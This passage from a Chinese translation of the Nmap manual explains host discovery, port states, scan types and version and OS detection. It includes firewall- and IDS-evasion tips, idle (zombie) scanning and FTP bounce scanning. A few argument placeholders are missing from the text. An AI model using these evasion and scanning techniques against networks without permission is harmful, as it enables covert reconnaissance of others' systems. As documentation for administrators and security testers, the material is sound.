Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN&#x2F;ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。\n-PA [portlist] (TCP ACK Ping)\nTCP ACK ping和刚才讨论的SYN ping相当类似。 也许您已经猜到了，区别就是设置TCP的ACK标志位而不是SYN标志位。 ACK报文表示确认一个建立连接的尝试，但该连接尚未完全建立。 所以远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果它们正在运行的话。\n-PA选项使用和SYN探测相同的默认端口(80)，也可以 用相同的格式指定目标端口列表。如果非特权用户尝试该功能， 或者指定的是IPv6目标，前面说过的connect()方法将被使用。 这个方法并不完美，因为它实际上发送的是SYN报文，而不是ACK报文。\n提供SYN和ACK两种ping探测的原因是使通过防火墙的机会尽可能大。 许多管理员会配置他们的路由器或者其它简单的防火墙来封锁SYN报文，除非 连接目标是那些公开的服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户访问互联网。 这种无状态的方法几乎不占用防火墙&#x2F;路由器的资源，因而被硬件和软件过滤器 广泛支持。Linux Netfilter&#x2F;iptables 防火墙软件提供方便的 –syn选项来实现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的SYN ping探测 (-PS) 很可能被封锁。这种情况下，ACK探测格外有闪光点，因为它正好利用了 这样的规则。\n另外一种常用的防火墙用有状态的规则来封锁非预期的报文。 这一特性已开始只存在于高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter&#x2F;iptables 通过 –state选项支持这一特性，它根据连接状态把报文 进行分类。SYN探测更有可能用于这样的系统，由于没头没脑的ACK报文 通常会被识别成伪造的而丢弃。解决这个两难的方法是通过即指定 -PS又指定-PA来即发送SYN又发送ACK。\n-PU [portlist] (UDP Ping)\n还有一个主机发现的选项是UDP ping，它发送一个空的(除非指定了–data-length UDP报文到给定的端口。端口列表的格式和前面讨论过的-PS和-PA选项还是一样。 如果不指定端口，默认是31338。该默认值可以通过在编译时改变nmap.h文件中的 DEFAULT-UDP-PROBE-PORT值进行配置。默认使用这样一个奇怪的端口是因为对开放端口 进行这种扫描一般都不受欢迎。\n如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文。 这对于Nmap意味着该机器正在运行。 许多其它类型的ICMP错误，像主机&#x2F;网络无法到达或者TTL超时则表示down掉的或者不可到达的主机。 没有回应也被这样解释。如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。这就是为什么默认探测端口是31338这样一个 极不可能被使用的端口。少数服务如chargen会响应一个空的UDP报文， 从而向Nmap表明该机器正在运行。\n该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器。 例如。我曾经有过一个Linksys BEFW11S4无线宽带路由器。默认情况下， 该设备对外的网卡过滤所有TCP端口，但UDP探测仍然会引发一个端口不可到达 的消息，从而暴露了它自己。\n-PE; -PP; -PM (ICMP Ping Types)\n除了前面讨论的这些不常见的TCP和UDP主机发现类型， Nmap也能发送世人皆知的ping 程序所发送的报文。Nmap发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。 对于网络探索者而言，不幸的是，许多主机和 防火墙现在封锁这些报文，而不是按期望的那样响应， 参见RFC 1122。因此，仅仅ICMP扫描对于互联网上的目标通常是不够的。 但对于系统管理员监视一个内部网络，它们可能是实际有效的途径。 使用-PE选项打开该回声请求功能。\n虽然回声请求是标准的ICMP ping查询， Nmap并不止于此。ICMP标准 (RFC 792)还规范了时间戳请求，信息请求 request，和地址掩码请求，它们的代码分别是13，15和17。 虽然这些查询的表面目的是获取信息如地址掩码和当前时间， 它们也可以很容易地用于主机发现。 很简单，回应的系统就是在运行的系统。Nmap目前没有实现信息请求报文， 因为它们还没有被广泛支持。RFC 1122 坚持 “主机不应该实现这些消息”。 时间戳和地址掩码查询可以分别用-PP和-PM选项发送。 时间戳响应(ICMP代码14)或者地址掩码响应(代码18)表示主机在运行。 当管理员特别封锁了回声请求报文而忘了其它ICMP查询可能用于 相同目的时，这两个查询可能很有价值。\n-PR (ARP Ping)\n最常见的Nmap使用场景之一是扫描一个以太局域网。在大部分局域网上，特别是那些使用基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。 当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百万次的ARP请求。\n当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。当它收到响应时，Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。 所以默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。\n-n (不用域名解析)\n告诉Nmap 永不对它发现的活动IP地址进行反向域名解析。既然DNS一般比较慢，这可以让事情更快些。\n-R (为所有目标解析域名)\n告诉Nmap 永远 对目标IP地址作反向域名解析。 一般只有当发现机器正在运行时才进行这项操作。\n–system-dns (使用系统域名解析器)\n默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项 (通过getnameinfo()调用一次解析一个IP)。除非Nmap的DNS代码有bug–如果是这样，请联系我们。 一般不使用该选项，因为它慢多了。系统解析器总是用于IPv6扫描。\n端口扫描基础虽然Nmap这些年来功能越来越多， 它也是从一个高效的端口扫描器开始的，并且那仍然是它的核心功能。 nmap 这个简单的命令扫描主机上的超过 1660个TCP端口。 。许多传统的端口扫描器只列出所有端口是开放还是关闭的， Nmap的信息粒度比它们要细得多。 它把端口分成六个状态: open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)， open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭或者被过滤的)。\n这些状态并非端口本身的性质，而是描述Nmap怎样看待它们。例如， 对于同样的目标机器的135&#x2F;tcp端口，从同网络扫描显示它是开放的，而跨网络作完全相同的扫描则可能显示它是 filtered(被过滤的)。\nNmap所识别的6个端口状态：\nopen(开放的)\n应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。\nclosed(关闭的)\n关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。\nfiltered(被过滤的)\n由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。\nunfiltered(未被过滤的)\n未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。\nopen|filtered(开放或者被过滤的)\n当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。\nclosed|filtered(关闭或者被过滤的)\n该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。\n端口扫描技术作为一个修车新手，我可能折腾几个小时来摸索怎样把基本工具(锤子，胶带，扳子等) 用于手头的任务。当我惨痛地失败，把我的老爷车拖到一个真正的技师那儿的时候 ，他总是在他的工具箱里翻来翻去，直到拽出一个完美的工具然后似乎不费吹灰之力搞定它。 端口扫描的艺术和这个类似。专家理解成打的扫描技术，选择最适合的一种 (或者组合)来完成给定的 任务。 另一方面，没有经验的用户和刚入门者总是用默认的SYN扫描解决每个问题。 既然Nmap是免费的，掌握端口扫描的唯一障碍就是知识。这当然是汽车世界所不能比的， 在那里，可能需要高超的技巧才能确定您需要一个压杆弹簧压缩机，接着您还得为它付数千美金。\n大部分扫描类型只对特权用户可用。 这是因为他们发送接收原始报文，这在Unix系统需要root权限。 在Windows上推荐使用administrator账户，但是当WinPcap已经被加载到操作系统时， 非特权用户也可以正常使用Nmap。当Nmap在1997年发布时，需要root权限是一个严重的 局限，因为很多用户只有共享的shell账户。现在，世界变了，计算机便宜了，更多人拥有互联网连接 ，桌面UNIX系统 (包括Linux和MAC OS X)很普遍了。Windows版本的Nmap现在也有了，这使它可以运行在更多的桌面上。 由于所有这些原因，用户不再需要用有限的共享shell账户运行Nmap。 这是很幸运的，因为特权选项让Nmap强大得多也灵活得多。\n虽然Nmap努力产生正确的结果，但请记住所有结果都是基于目标机器(或者它们前面的防火墙)返回的报文的。 。这些主机也许是不值得信任的，它们可能响应以迷惑或误导Nmap的报文。 更普遍的是非RFC兼容的主机以不正确的方式响应Nmap探测。FIN，Null和Xmas扫描 特别容易遇到这个问题。这些是特定扫描类型的问题，因此我们在个别扫描类型里讨论它们。\n这一节讨论Nmap支持的大约十几种扫描技术。 一般一次只用一种方法， 除了UDP扫描(-sU)可能和任何一种TCP扫描类型结合使用。 友情提示一下，端口扫描类型的选项格式是-s， 其中 是个显眼的字符，通常是第一个字符。 一个例外是deprecated FTP bounce扫描(-b)。默认情况下，Nmap执行一个 SYN扫描，但是如果用户没有权限发送原始报文(在UNIX上需要root权限)或者如果指定的是IPv6目标，Nmap调用connect()。 本节列出的扫描中，非特权用户只能执行connect()和ftp bounce扫描。\n-sS (TCP SYN扫描)\nSYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin&#x2F;Null&#x2F;Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态\n它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN&#x2F;ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。\n-sT (TCP connect()扫描)\n当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描。 当用户没有权限发送原始报文或者扫描IPv6网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和Web浏览器，P2P客户端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用。它是叫做Berkeley Sockets API编程接口的一部分。Nmap用 该API获得每个连接尝试的状态信息，而不是读取响应的原始报文。\n当SYN扫描可用时，它通常是更好的选择。因为Nmap对高层的 connect()调用比对原始报文控制更少， 所以前者效率较低。 该系统调用完全连接到开放的目标端口而不是像SYN扫描进行 半开放的复位。这不仅花更长时间，需要更多报文得到同样信息，目标机也更可能 记录下连接。IDS(入侵检测系统)可以捕获两者，但大部分机器没有这样的警报系统。 当Nmap连接，然后不发送数据又关闭连接， 许多普通UNIX系统上的服务会在syslog留下记录，有时候是一条加密的错误消息。 此时，有些真正可怜的服务会崩溃，虽然这不常发生。如果管理员在日志里看到来自同一系统的 一堆连接尝试，她应该知道她的系统被扫描了。\n-sU (UDP扫描)\n虽然互联网上很多流行的服务运行在TCP 协议上，UDP服务也不少。 DNS，SNMP，和DHCP (注册的端口是53，161&#x2F;162，和67&#x2F;68)是最常见的三个。 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。 这是一个错误，因为可探测的UDP服务相当普遍，攻击者当然不会忽略整个协议。 所幸，Nmap可以帮助记录并报告UDP端口。\nUDP扫描用-sU选项激活。它可以和TCP扫描如 SYN扫描 (-sS)结合使用来同时检查两种协议。\nUDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。\nUDP扫描的巨大挑战是怎样使它更快速。 开放的和被过滤的端口很少响应，让Nmap超时然后再探测，以防探测帧或者 响应丢失。关闭的端口常常是更大的问题。 它们一般发回一个ICMP端口无法到达错误。但是不像关闭的TCP端口响应SYN或者Connect 扫描所发送的RST报文，许多主机在默认情况下限制ICMP端口不可到达消息。 Linux和Solaris对此特别严格。例如， Linux 2.4.20内核限制一秒钟只发送一条目标不可到达消息 (见net&#x2F;ipv4&#x2F;icmp。c)。\nNmap探测速率限制并相应地减慢来避免用那些目标机会丢弃的无用报文来阻塞 网络。不幸的是，Linux式的一秒钟一个报文的限制使65,536个端口的扫描要花 18小时以上。加速UDP扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速 扫描，从防火墙后面扫描，使用–host-timeout跳过慢速的 主机。\n-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描)\n这三种扫描类型 (甚至用下一节描述的 –scanflags 选项的更多类型) 在TCP RFC中发掘了一个微妙的方法来区分open(开放的)和 closed(关闭的)端口。第65页说“如果 [目标]端口状态是关闭的…. 进入的不含RST的报文导致一个RST响应。” 接下来的一页 讨论不设置SYN，RST，或者ACK位的报文发送到开放端口: “理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 ”\n如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK， 任何其它三种(FIN，PSH，and URG)的组合都行。Nmap有三种扫描类型利用这一点：\nNull扫描 (-sN)\n不设置任何标志位(tcp标志头是0)\nFIN扫描 (-sF)\n只设置TCP FIN标志位。\nXmas扫描 (-sX)\n设置FIN，PSH，和URG标志位，就像点亮圣诞树上所有的灯一样。\n除了探测报文的标志位不同，这三种扫描在行为上完全一致。 如果收到一个RST报文，该端口被认为是 closed(关闭的)，而没有响应则意味着 端口是open|filtered(开放或者被过滤的)。 如果收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为 被过滤的。\n这些扫描的关键优势是它们能躲过一些无状态防火墙和报文过滤路由器。 另一个优势是这些扫描类型甚至比SYN扫描还要隐秘一些。但是别依赖它 – 多数 现代的IDS产品可以发现它们。一个很大的不足是并非所有系统都严格遵循RFC 793。 许多系统不管端口开放还是关闭，都响应RST。 这导致所有端口都标记为closed(关闭的)。 这样的操作系统主要有Microsoft Windows，许多Cisco设备，BSDI，以及IBM OS&#x2F;400。 但是这种扫描对多数UNIX系统都能工作。这些扫描的另一个不足是 它们不能辨别open(开放的)端口和一些特定的 filtered(被过滤的)端口，从而返回 open|filtered(开放或者被过滤的)。\n-sA (TCP ACK扫描)\n这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。\nACK扫描探测报文只设置ACK标志位(除非您使用 –scanflags)。当扫描未被过滤的系统时， open(开放的)和closed(关闭的) 端口 都会返回RST报文。Nmap把它们标记为 unfiltered(未被过滤的)，意思是 ACK报文不能到达，但至于它们是open(开放的)或者 closed(关闭的) 无法确定。不响应的端口 或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)。\n-sW (TCP窗口扫描)\n除了利用特定系统的实现细节来区分开放端口和关闭端口，当收到RST时不总是打印unfiltered， 窗口扫描和ACK扫描完全一样。 它通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 unfiltered， 而是根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed\n该扫描依赖于互联网上少数系统的实现细节， 因此您不能永远相信它。不支持它的系统会通常返回所有端口closed。 当然，一台机器没有开放端口也是有可能的。 如果大部分被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统就非常可疑了。 偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示1000个开放的端口和3个关闭的或者被过滤的端口， 那么那3个很可能也是开放的端口。\n-sM (TCP Maimon扫描)\nMaimon扫描是用它的发现者Uriel Maimon命名的。他在 Phrack Magazine issue #49 (November 1996)中描述了这一技术。 Nmap在两期后加入了这一技术。 这项技术和Null，FIN，以及Xmas扫描完全一样，除了探测报文是FIN&#x2F;ACK。 根据RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应RST报文。 然而，Uriel注意到如果端口开放，许多基于BSD的系统只是丢弃该探测报文。\n–scanflags (定制的TCP扫描)\n真正的Nmap高级用户不需要被这些现成的扫描类型束缚。 –scanflags选项允许您通过指定任意TCP标志位来设计您自己的扫描。 让您的创造力流动，躲开那些仅靠本手册添加规则的入侵检测系统！\n–scanflags选项可以是一个数字标记值如9 (PSH和FIN)， 但使用字符名更容易些。 只要是URG， ACK，PSH， RST，SYN，and FIN的任何组合就行。例如，–scanflags URGACKPSHRSTSYNFIN设置了所有标志位，但是这对扫描没有太大用处。 标志位的顺序不重要。\n除了设置需要的标志位，您也可以设置 TCP扫描类型(如-sA或者-sF)。 那个基本类型告诉Nmap怎样解释响应。例如， SYN扫描认为没有响应意味着 filtered端口，而FIN扫描则认为是 open|filtered。 除了使用您指定的TCP标记位，Nmap会和基本扫描类型一样工作。 如果您不指定基本类型，就使用SYN扫描。\n-sI &lt;zombie host[:probeport]&gt; (Idlescan)\n这种高级的扫描方法允许对目标进行真正的TCP端口盲扫描 (意味着没有报文从您的真实IP地址发送到目标)。相反，side-channel攻击 利用zombie主机上已知的IP分段ID序列生成算法来窥探目标上开放端口的信息。 IDS系统将显示扫描来自您指定的zombie机(必须运行并且符合一定的标准)。 这种奇妙的扫描类型太复杂了，不能在此完全描述，所以我写一篇非正式的论文， 发布在https://nmap.org/book/idlescan.html。\n除了极端隐蔽(由于它不从真实IP地址发送任何报文)， 该扫描类型可以建立机器间的基于IP的信任关系。 端口列表从zombie 主机的角度。显示开放的端口。 因此您可以尝试用您认为(通过路由器&#x2F;包过滤规则)可能被信任的 zombies扫描目标。\n如果您由于IPID改变希望探测zombie上的特定端口， 您可以在zombie 主机后加上一个冒号和端口号。 否则Nmap会使用默认端口(80)。\n-sO (IP协议扫描)\nIP 协议扫描可以让您确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等)。从技术上说，这不是端口扫描 ，既然它遍历的是IP协议号而不是TCP或者UDP端口号。 但是它仍使用 -p选项选择要扫描的协议号， 用正常的端口表格式报告结果，甚至用和真正的端口扫描一样 的扫描引擎。因此它和端口扫描非常接近，也被放在这里讨论。\n除了本身很有用，协议扫描还显示了开源软件的力量。 尽管基本想法非常简单，我过去从没想过增加这一功能也没收到任何对它的请求。 在2000年夏天，Gerhard Rieger孕育了这个想法，写了一个很棒的补丁程序，发送到nmap-hackers邮件列表。 我把那个补丁加入了Nmap，第二天发布了新版本。 几乎没有商业软件会有用户有足够的热情设计并贡献他们的改进。\n协议扫描以和UDP扫描类似的方式工作。它不是在UDP报文的端口域上循环， 而是在IP协议域的8位上循环，发送IP报文头。 报文头通常是空的，不包含数据，甚至不包含所申明的协议的正确报文头 TCP，UDP，和ICMP是三个例外。它们三个会使用正常的协议头，因为否则某些系 统拒绝发送，而且Nmap有函数创建它们。协议扫描不是注意ICMP端口不可到达消息， 而是ICMP 协议不可到达消息。如果Nmap从目标主机收到 任何协议的任何响应，Nmap就把那个协议标记为open。 ICMP协议不可到达 错误(类型 3，代号 2) 导致协议被标记为 closed。其它ICMP不可到达协议(类型 3，代号 1，3，9，10，或者13) 导致协议被标记为 filtered (虽然同时他们证明ICMP是 open )。如果重试之后仍没有收到响应， 该协议就被标记为open|filtered\n-b (FTP弹跳扫描)\nFTP协议的一个有趣特征(RFC 959) 是支持所谓代理ftp连接。它允许用户连接到一台FTP服务器，然后要求文件送到一台第三方服务器。 这个特性在很多层次上被滥用，所以许多服务器已经停止支持它了。其中一种就是导致FTP服务器对其它主机端口扫描。 只要请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。 这是绕过防火墙的好方法，因为FTP服务器常常被置于可以访问比Web主机更多其它内部主机的位置。 Nmap用-b选项支持ftp弹跳扫描。参数格式是 :@:。 是某个脆弱的FTP服务器的名字或者IP地址。 您也许可以省略:， 如果服务器上开放了匿名用户(user:anonymous password:-wwwuser@)。 端口号(以及前面的冒号) 也可以省略，如果使用默认的FTP端口(21)。\n当Nmap1997年发布时，这个弱点被广泛利用，但现在大部分已经被fix了。 脆弱的服务器仍然存在，所以如果其它都失败了，这也值得一试。 如果您的目标是绕过防火墙，扫描目标网络上的开放的21端口(或者 甚至任何ftp服务，如果您用版本探测扫描所有端口)， 然后对每个尝试弹跳扫描。Nmap会告诉您该主机脆弱与否。 如果您只是试着玩Nmap，您不必(事实上，不应该)限制您自己。 在您随机地在互联网上寻找脆弱的FTP服务器时，考虑一下系统管理员不太喜欢您这样滥用他们的服务器。\n端口说明和扫描顺序除了所有前面讨论的扫描方法， Nmap提供选项说明那些端口被扫描以及扫描是随机还是顺序进行。 默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描。\n-p (只扫描指定的端口)\n该选项指明您想扫描的端口，覆盖默认值。 单个端口和用连字符表示的端口范围(如 1-1023)都可以。 范围的开始以及&#x2F;或者结束值可以被省略， 分别导致Nmap使用1和65535。所以您可以指定 -p-从端口1扫描到65535。 如果您特别指定，也可以扫描端口0。 对于IP协议扫描(-sO)，该选项指定您希望扫描的协议号 (0-255)。\n当既扫描TCP端口又扫描UDP端口时，您可以通过在端口号前加上T: 或者U:指定协议。 协议限定符一直有效您直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25，80，139，8080 将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口。注意，要既扫描 UDP又扫描TCP，您必须指定 -sU ，以及至少一个TCP扫描类型(如 -sS，-sF，或者 -sT)。如果没有给定协议限定符， 端口号会被加到所有协议列表。\n-F (快速 (有限的端口) 扫描)\n在nmap的nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口。 这比扫描所有65535个端口快得多。 因为该列表包含如此多的TCP端口(1200多)，这和默认的TCP扫描 scan (大约1600个端口)速度差别不是很大。如果您用–datadir选项指定您自己的 小小的nmap-services文件 ，差别会很惊人。\n-r (不要按随机顺序扫描端口)\n默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。这种随机化通常都是受欢迎的， 但您也可以指定-r来顺序端口扫描。\n服务和版本探测把Nmap指向一个远程机器，它可能告诉您 端口25&#x2F;tcp，80&#x2F;tcp，和53&#x2F;udp是开放的。使用包含大约2,200个著名的服务的 nmap-services数据库， Nmap可以报告那些端口可能分别对应于一个邮件服务器 (SMTP)，web服务器(HTTP)，和域名服务器(DNS)。 这种查询通常是正确的 – 事实上，绝大多数在TCP端口25监听的守护进程是邮件 服务器。然而，您不应该把赌注押在这上面! 人们完全可以在一些奇怪的端口上运行服务。\n即使Nmap是对的，假设运行服务的确实是 SMTP，HTTP和DNS，那也不是特别多的信息。 当为您的公司或者客户作安全评估(或者甚至简单的网络明细清单)时， 您确实想知道正在运行什么邮件和域名服务器以及它们的版本。 有一个精确的版本号对了解服务器有什么漏洞有巨大帮助。 版本探测可以帮您获得该信息。\n在用某种其它类型的扫描方法发现TCP 和&#x2F;或者UDP端口后， 版本探测会询问这些端口，确定到底什么服务正在运行。 nmap-service-probes 数据库包含查询不同服务的探测报文 和解析识别响应的匹配表达式。 Nmap试图确定服务协议 (如 ftp，ssh，telnet，http)，应用程序名(如ISC Bind，Apache httpd，Solaris telnetd)，版本号， 主机名，设备类型(如 打印机，路由器)，操作系统家族 (如Windows，Linux)以及其它的细节，如 如是否可以连接X server，SSH协议版本 ，或者KaZaA用户名)。当然，并非所有服务都提供所有这些信息。 如果Nmap被编译成支持OpenSSL， 它将连接到SSL服务器，推测什么服务在加密层后面监听。 当发现RPC服务时， Nmap RPC grinder (-sR)会自动被用于确定RPC程序和它的版本号。 如果在扫描某个UDP端口后仍然无法确定该端口是开放的还是被过滤的，那么该端口状态就 被标记为open|filtered。 版本探测将试图从这些端口引发一个响应(就像它对开放端口做的一样)， 如果成功，就把状态改为开放。 open|filtered TCP端口用同样的方法对待。 注意Nmap -A选项在其它情况下打开版本探测。 有一篇关于版本探测的原理，使用和定制的文章在http://www.insecure.org/nmap/vscan/。\n当Nmap从某个服务收到响应，但不能在数据库中找到匹配时， 它就打印一个特殊的fingerprint和一个URL给您提交，如果您确实知道什么服务运行在端口。 请花两分钟提交您的发现，让每个人受益。由于这些提交， Nmap有350种以上协议如smtp，ftp，http等的大约3，000条模式匹配。\n用下列的选项打开和控制版本探测：\n-sV (版本探测)\n打开版本探测。 您也可以用-A同时打开操作系统探测和版本探测。\n–allports (不为版本探测排除任何端口)\n默认情况下，Nmap版本探测会跳过9100 TCP端口，因为一些打印机简单地打印送到该端口的 任何数据，这回导致数十页HTTP get请求，二进制 SSL会话请求等等被打印出来。这一行为可以通过修改或删除nmap-service-probes 中的Exclude指示符改变， 您也可以不理会任何Exclude指示符，指定–allports扫描所有端口\n–version-intensity (设置 版本扫描强度)\n当进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值。 被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一般没什么用。强度水平说明了应该使用哪些探测报文。数值越高， 服务越有可能被正确识别。 然而，高强度扫描花更多时间。强度值必须在0和9之间。 默认是7。当探测报文通过nmap-service-probes ports指示符 注册到目标端口时，无论什么强度水平，探测报文都会被尝试。这保证了DNS 探测将永远在任何开放的53端口尝试， SSL探测将在443端口尝试，等等。\n–version-light (打开轻量级模式)\n这是 –version-intensity 2的方便的别名。轻量级模式使 版本扫描快许多，但它识别服务的可能性也略微小一点。\n–version-all (尝试每个探测)\n–version-intensity 9的别名， 保证对每个端口尝试每个探测报文。\n–version-trace (跟踪版本扫描活动)\n这导致Nmap打印出详细的关于正在进行的扫描的调试信息。 它是您用–packet-trace所得到的信息的子集。\n-sR (RPC扫描)\n这种方法和许多端口扫描方法联合使用。 它对所有被发现开放的TCP&#x2F;UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，如果是， 是什么程序和版本号。因此您可以有效地获得和rpcinfo -p一样的信息， 即使目标的端口映射在防火墙后面(或者被TCP包装器保护)。Decoys目前不能和RPC scan一起工作。 这作为版本扫描(-sV)的一部分自动打开。 由于版本探测包括它并且全面得多，-sR很少被需要。\n操作系统探测Nmap最著名的功能之一是用TCP&#x2F;IP协议栈fingerprinting进行远程操作系统探测。 Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。 在进行一打测试如TCP ISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后， Nmap把结果和数据库nmap-os-fingerprints中超过 1500个已知的操作系统的fingerprints进行比较，如果有匹配，就打印出操作系统的详细信息。 每个fingerprint包括一个自由格式的关于OS的描述文本， 和一个分类信息，它提供供应商名称(如Sun)，下面的操作系统(如Solaris)，OS版本(如10)， 和设备类型(通用设备，路由器，switch，游戏控制台， 等)。\n如果Nmap不能猜出操作系统，并且有些好的已知条件(如 至少发现了一个开放端口和一个关闭端口)，Nmap会提供一个 URL，如果您确知运行的操作系统，您可以把fingerprint提交到那个URL。 这样您就扩大了Nmap的操作系统知识库，从而让每个Nmap用户都受益。\n操作系统检测可以进行其它一些测试，这些测试可以利用处理 过程中收集到的信息。例如运行时间检测，使用TCP时间戳选项(RFC 1323) 来估计主机上次重启的时间，这仅适用于提供这类信息的主机。另一种 是TCP序列号预测分类，用于测试针对远程主机建立一个伪造的TCP连接 的可能难度。这对于利用基于源IP地址的可信关系(rlogin，防火墙过滤等) 或者隐含源地址的攻击非常重要。这一类哄骗攻击现在很少见，但一些 主机仍然存在这方面的漏洞。实际的难度值基于统计采样，因此可能会有 